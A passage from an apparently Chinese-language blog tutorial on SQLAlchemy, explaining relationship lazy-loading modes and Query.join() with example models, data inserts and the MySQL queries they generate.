operator">=</span> Column<span class="token punctuation">(</span>DateTime<span class="token punctuation">)</span>    u_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'user_3.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    user <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'User_2'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'articles'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建表</span>Base<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>drop_all<span class="token punctuation">(</span>engine<span class="token punctuation">)</span>Base<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>create_all<span class="token punctuation">(</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 添加数据</span>u1 <span class="token operator">=</span> User_1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a1 <span class="token operator">=</span> Article_1<span class="token punctuation">(</span>id<span class="token operator">=</span>i<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack child'</span><span class="token punctuation">,</span> create_time<span class="token operator">=</span><span class="token string">'201{}-1{}-2{} 11:2{}:1{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">,</span>i<span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">,</span>i<span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">,</span>i<span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> u_id<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">)</span>    u1<span class="token punctuation">.</span>articles<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a1<span class="token punctuation">)</span>    session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>u2 <span class="token operator">=</span> User_2<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a2 <span class="token operator">=</span> Article_2<span class="token punctuation">(</span>id<span class="token operator">=</span>i<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack child'</span><span class="token punctuation">,</span>                   create_time<span class="token operator">=</span><span class="token string">'201{}-1{}-2{} 11:2{}:1{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">,</span> i <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">,</span> i <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">,</span> i <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">,</span> i <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> u_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    u2<span class="token punctuation">.</span>articles<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a2<span class="token punctuation">)</span>    session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>a2<span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><ol><li>使用默认创建的一对多关系,查看<code>Model</code>上的关系</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true"># 拿到 父表 映射 类 中的 第一条实例,也就是 第一个作者</span>q1 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User_1<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 通过关系的映射 relationship 来查看子表中第一个作者写的所有文章</span>q1<span class="token punctuation">.</span>articles<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后对照<code>mysql</code>的查询日志,查看他的<code>SQL</code>语句</p><pre class="line-numbers language-shell"><code class="language-shell">$ tail -10 /mysql_data/localhost_log...2020-08-25T16:57:14.768883Z       52 Query    SELECT article_2.id AS article_2_id, article_2.name AS article_2_name, article_2.create_time AS article_2_create_time, article_2.u_id AS article_2_u_id FROM article_2 WHERE 1 = article_2.u_id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到,它其实是查找了,所有<code>u_id=1</code> 的所有数据,上面添加了100条数据,它会把这100条数据全部输出.</p><p>假如,只想从这100条数据中查询出某一条数据,那上面的<code>q1.articles</code> 就不能满足需求了.这时候就需要懒查询.</p><hr><ol start="2"><li>使用<code>lazy=dynamic</code></li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>q2 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User_2<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>q2<span class="token punctuation">.</span>articles<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在<code>MySQL</code>日志中查看:</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">tail</span> -10 /mysql_data/localhost_log<span class="token punctuation">..</span>.2020-08-25T17:01:33.765645Z       53 Query    SELECT user_3.id AS user_3_id, user_3.name AS user_3_name FROM user_3  LIMIT 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为什么会这样,进一步看:</p><pre class="line-numbers language-python"><code class="language-python">t <span class="token operator">=</span> q2<span class="token punctuation">.</span>articles<span class="token keyword">print</span><span class="token punctuation">(</span>type<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#&lt;class 'sqlalchemy.orm.dynamic.AppenderQuery'></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到,当设置了<code>lazy=dynamic</code> 后,<code>q2.articles</code> 的操作就不是去数据库取出所有的数据了,而是返回一个<code>AppenderQuery</code> 对象.这里来查看一下这个对象.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm<span class="token punctuation">.</span>dynamic <span class="token keyword">import</span> AppenderQuery<span class="token operator">>></span><span class="token operator">></span> help<span class="token punctuation">(</span>AppenderQuery<span class="token punctuation">)</span>Help on <span class="token keyword">class</span> <span class="token class-name">AppenderQuery</span> <span class="token keyword">in</span> module sqlalchemy<span class="token punctuation">.</span>orm<span class="token punctuation">.</span>dynamic<span class="token punctuation">:</span><span class="token keyword">class</span> <span class="token class-name">AppenderQuery</span><span class="token punctuation">(</span>AppenderMixin<span class="token punctuation">,</span> sqlalchemy<span class="token punctuation">.</span>orm<span class="token punctuation">.</span>query<span class="token punctuation">.</span>Query<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到,<code>AppenderQuery</code> 是继承自<code>AppenderMixin</code> 和<code>salalcemy.orm.query.Query</code> 这两个类的.那么这个对象首先就拥有了<code>Query</code> 查询的所有方法(比如<code>filter,count,limit,offset等</code>).</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 查询一个实例</span>q3 <span class="token operator">=</span> t<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>Article2<span class="token punctuation">.</span>create_time<span class="token operator">==</span><span class="token string">'2011-11-21 11:21:11'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>Article2<span class="token punctuation">.</span>id<span class="token operator">==</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span>all<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>type<span class="token punctuation">(</span>q3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q3<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-lazy-joined"><a href="#3-lazy-joined" class="headerlink" title="3.lazy=joined"></a>3.<code>lazy=joined</code></h4><blockquote><p>基于上面,对比<code>lazy=joined</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">User_3</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'user_4'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    articles <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Article_3'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">,</span> lazy<span class="token operator">=</span><span class="token string">'joined'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Article_3</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'article_4'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    create_time <span class="token operator">=</span> Column<span class="token punctuation">(</span>DateTime<span class="token punctuation">)</span>    u_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'user_4.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    user <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'User_3'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'articles'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建表</span>Base<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>drop_all<span class="token punctuation">(</span>engine<span class="token punctuation">)</span>Base<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>create_all<span class="token punctuation">(</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 添加数据</span>u3 <span class="token operator">=</span> User_3<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Jack'</span><span class="token punctuation">)</span>a3 <span class="token operator">=</span> Article_3<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'sdf'</span><span class="token punctuation">,</span> create_time<span class="token operator">=</span><span class="token string">'2011-11-21 11:21:11'</span><span class="token punctuation">,</span>u_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>a4 <span class="token operator">=</span> Article_3<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'sdf'</span><span class="token punctuation">,</span> create_time<span class="token operator">=</span><span class="token string">'2011-11-21 11:21:11'</span><span class="token punctuation">,</span>u_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>u3<span class="token punctuation">.</span>articles <span class="token operator">=</span> <span class="token punctuation">[</span>a3<span class="token punctuation">,</span> a4<span class="token punctuation">]</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>u3<span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查询</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 查询</span>q4 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User_3<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>tt <span class="token operator">=</span> q4<span class="token punctuation">.</span>articlestype<span class="token punctuation">(</span>tt<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># # sqlalchemy.orm.collections.InstrumentedList</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到,它返回的也是所有的查询结果,但是,查看<code>mysql</code> 的查询日志,可以看到它执行的查询语句是</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> anon_1<span class="token punctuation">.</span>user_4_id <span class="token keyword">AS</span> anon_1_user_4_id<span class="token punctuation">,</span> anon_1<span class="token punctuation">.</span>user_4_name <span class="token keyword">AS</span> anon_1_user_4_name<span class="token punctuation">,</span> article_4_1<span class="token punctuation">.</span>id <span class="token keyword">AS</span> article_4_1_id<span class="token punctuation">,</span> article_4_1<span class="token punctuation">.</span>name <span class="token keyword">AS</span> article_4_1_name<span class="token punctuation">,</span> article_4_1<span class="token punctuation">.</span>create_time <span class="token keyword">AS</span> article_4_1_create_time<span class="token punctuation">,</span> article_4_1<span class="token punctuation">.</span>u_id <span class="token keyword">AS</span> article_4_1_u_id <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> user_4<span class="token punctuation">.</span>id <span class="token keyword">AS</span> user_4_id<span class="token punctuation">,</span> user_4<span class="token punctuation">.</span>name <span class="token keyword">AS</span> user_4_name <span class="token keyword">FROM</span> user_4  <span class="token keyword">LIMIT</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> anon_1 <span class="token keyword">LEFT</span> <span class="token keyword">OUTER</span> <span class="token keyword">JOIN</span> article_4 <span class="token keyword">AS</span> article_4_1 <span class="token keyword">ON</span> anon_1<span class="token punctuation">.</span>user_4_id <span class="token operator">=</span> article_4_1<span class="token punctuation">.</span>u_id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>它首先执行了一个子查询,然后执行了一个外连接查询.</p><p><code>lazy</code> 指定的参数不同,执行的效率也是不同的.</p></blockquote><h3 id="16-join"><a href="#16-join" class="headerlink" title="16.join"></a>16.<code>join</code></h3><blockquote><p>创建表</p><pre class="line-numbers language-python"><code class="language-python">rom sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span>String<span class="token punctuation">,</span>Integer<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> ForeignKey<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> relationship<span class="token comment" spellcheck="true"># 1.创建连接</span>engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span><span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101/test'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建 session池,并实例化</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.创建基类</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建Model</span><span class="token keyword">class</span> <span class="token class-name">User1</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>      __tablename__ <span class="token operator">=</span> <span class="token string">'user_1'</span>      id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>      name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      fullname <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      nickname <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 定义双向对应,连接的是 Model</span>      address <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Address1'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Address1</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>      __tablename__ <span class="token operator">=</span> <span class="token string">'addresses_1'</span>      id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>      email_address <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 定义外键</span>      user_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'user_1.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 定义双向对应</span>      user <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'User1'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'address'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建表</span>Base<span class="token punctuation">.</span>metadate<span class="token punctuation">.</span>create_all<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 添加数据</span>Jack<span class="token operator">=</span>User1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'Jack'</span><span class="token punctuation">,</span> fullname<span class="token operator">=</span><span class="token string">"Jack Ning"</span><span class="token punctuation">,</span> nickname<span class="token operator">=</span><span class="token string">'Ningning'</span><span class="token punctuation">)</span>Jack<span class="token punctuation">.</span>address <span class="token operator">=</span> <span class="token punctuation">[</span>Address1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> email_address<span class="token operator">=</span><span class="token string">'xxx@xx1.com'</span><span class="token punctuation">,</span> user_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Address1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> email_address<span class="token operator">=</span><span class="token string">'xxx@xx2.com'</span><span class="token punctuation">,</span> user_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Address1<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> email_address<span class="token operator">=</span><span class="token string">'xxx@xx3.com'</span><span class="token punctuation">,</span> user_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>Jack<span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行<code>join</code> 查询,默认是内连接.</p><hr><p>普通的交叉连接可以这样查询</p><pre class="line-numbers language-python">q1 = session.query(User1, Address1).all()</code></pre><p>通过日志查看,它相当查询了一个笛卡尔积.</p><pre><code class="bash"><code class="language-python">q1 = session.query(User1, Address1).all()</code></pre><p>通过日志查看,它相当查询了一个笛卡尔积.</p><pre><code class="bash">[root@localhost ~]# tail -5 /mysql_data/localhost.logSELECT user_1.id AS user_1_id, user_1.name AS user_1_name, user_1.fullname AS user_1_fullname, user_1.nickname AS user_1_nickname, addresses_1.id AS addresses_1_id, addresses_1.email_address AS addresses_1_email_address, addresses_1.user_id AS addresses_1_user_id FROM user_1, addresses_1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用<code>Queue.join()</code> 查询</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> q2 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User1<span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>Address1<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>Address1<span class="token punctuation">.</span>email_address <span class="token operator">==</span> <span class="token string">'xxx@xx3.com'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>q2<span class="token punctuation">)</span>SELECT user_1<span class="token punctuation">.</span>id AS user_1_id<span class="token punctuation">,</span> user_1<span class="token punctuation">.</span>name AS user_1_name<span class="token punctuation">,</span> user_1<span class="token punctuation">.</span>fullname AS user_1_fullname<span class="token punctuation">,</span> user_1<span class="token punctuation">.</span>nickname AS user_1_nickname FROM user_1 INNER JOIN addresses_1 ON user_1<span class="token punctuation">.</span>id <span class="token operator">=</span> addresses_1<span class="token punctuation">.</span>user_id WHERE addresses_1<span class="token punctuation">.</span>email_address <span class="token operator">=</span> <span class="token operator">%</span><span class="token punctuation">(</span>email_address_1<span class="token punctuation">)</span>s<span class="token comment" spellcheck="true"># 它相当于要执行如上语句,但是并没有去执行,调用 one(),get(),all() 去执行语句</span><span class="token operator">>></span><span class="token operator">></span> q2<span class="token punctuation">.</span>all<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用<code>all()</code> 之后,查看日志</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tail -5 /mysql_data/localhost.log</span><span class="token punctuation">..</span>.SELECT user_1.id AS user_1_id, user_1.name AS user_1_name, user_1.fullname AS user_1_fullname, user_1.nickname AS user_1_nickname FROM user_1 INNER JOIN addresses_1 ON user_1.id <span class="token operator">=</span> addresses_1.user_id WHERE addresses_1.email_address <span class="token operator">=</span> <span class="token string">'xxx@xx3.com'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到,如果join()直接写<code>Address1</code> ,相当于一个内连接,<code>filter</code> 在这里扮演了<code>where</code> 子句的作用.</p><p>那么在<code>SQL</code> 语句中,<code>join...on...</code> 是有<code>on</code>子句做条件的.对应到<code>sqlalchemy</code>的<code>join</code>函数,这个函数会处理<code>join...on</code> 的判断条件.因为<code>User1</code> 和<code>Address1</code> 是通过外键连接的,也就是表<code>user_1</code>和<code>addresses_1</code> 是通过外键连接的,这里<code>join(Address1)</code> 虽然没有写条件,但是<code>join</code>() 函数会自动通过外键去连接这两张表.</p><p><code>User_1</code> 和<code>Address_1</code> 他们的关系却是双向的,也就是说,除了<code>Address_1</code> 代表表<code>addresses_1</code>,也可以通过<code>User_1.address</code> 这个属性去代表<code>address_1</code> 这张表.</p><pre class="line-numbers language-python"><code class="language-python">q4 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User1<span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>User1<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q4<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT user_1.id AS user_1_id, user_1.name AS user_1_name, user_1.fullname AS user_1_fullname, user_1.nickname AS user_1_nickname FROM user_1 INNER JOIN addresses_1 ON user_1.id = addresses_1.user_id"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>join</code>() 函数还可以容纳多个<code>on</code>子句(表与表之间通过外键连接).比如:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">oders</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">Items</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">pass</span>q4 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User1<span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>Address_1<span class="token punctuation">,</span> Oders<span class="token punctuation">,</span> Items<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 通过属性连接,相当于</span>q4 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User1<span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>User1<span class="token punctuation">.</span>address<span class="token punctuation">,</span>                             Address_1<span class="token punctuation">.</span>oders<span class="token punctuation">,</span>                            Oders<span class="token punctuation">.</span>items<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 表与表之间是通过外键连接的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>join()</code> 函数还可以加入<code>Table</code> 对象.比如:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 比如多对多中的Table对象,</span><span class="token comment" spellcheck="true"># 新建一个Table对象,有外键连接</span>table_test <span class="token operator">=</span> Table<span class="token punctuation">(</span><span class="token string">'table_test'</span><span class="token punctuation">,</span> Base<span class="token punctuation">.</span>metadata<span class="token punctuation">,</span>                Column<span class="token punctuation">(</span><span class="token string">'c_id'</span><span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'user_1.id'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 内连接 外键是条件判断对象</span>q4 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User1<span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>table_test<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>join()</code> 函数还可以显式的把<code>on</code>子句加入:</p><pre class="line-numbers language-python"><code class="language-python">q5 <span class="token operator">=</span> session<span class="token 